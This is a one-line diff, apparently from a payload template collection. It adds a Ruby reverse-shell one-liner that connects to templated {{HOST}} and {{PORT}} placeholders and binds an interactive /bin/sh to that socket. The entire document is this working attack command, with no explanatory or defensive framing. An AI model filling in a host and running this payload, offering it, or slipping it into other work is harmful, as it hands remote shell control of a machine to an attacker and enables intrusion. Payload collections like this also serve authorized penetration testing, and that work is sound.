@@ -1,0 +1,1 @@
+ruby -rsocket -e 's=TCPSocket.open("{{HOST}}",{{PORT}});s.close_on_exec=false;f=s.to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
